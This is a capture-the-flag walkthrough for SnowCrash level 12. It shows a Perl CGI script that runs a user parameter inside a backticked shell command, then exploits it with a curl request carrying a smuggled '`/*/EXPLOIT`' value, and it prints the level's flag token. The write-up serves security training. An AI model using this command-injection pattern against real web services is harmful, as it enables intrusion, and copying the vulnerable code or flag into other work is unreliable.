# SnowCrash

## Level12

```sh
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

```pl
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0]; 					# First Argument (param "x")
  $xx =~ tr/a-z/A-Z/; 				# Convert "x" to uppercase
  $xx =~ s/\s.*//; 				# Remove everything after the first whitespace in "x"
  @output = `egrep "^$xx" /tmp/xd 2>&1`; 	# Execute a shell command using "x", this can be exploited
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

We need to make a query to localhost using the x param

We cannot directly use getflag because of the first regex that transforms the string to uppercase

So we will need to create a script with an uppercase name that will run getflag for us

```sh
level12@SnowCrash:~$ echo "getflag > /tmp/exploit" > /tmp/EXPLOIT
level12@SnowCrash:~$ chmod 777 /tmp/EXPLOIT
```

Since we can only create file inside of /tmp and that /tmp will be replaced by /TMP, we need to make use of wildcards,

```sh
level12@SnowCrash:~$ curl localhost:4646?x='`/*/EXPLOIT`'
..level12@SnowCrash:~$ cat /tmp/exploit
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

The single quotes allowed us to prevent the local shell (the one used to call curl) from interpreting the wildcard
and to send the string content literally to the perl script

The backquotes allowd us to instruct the remoted shell (on the server) to execute the command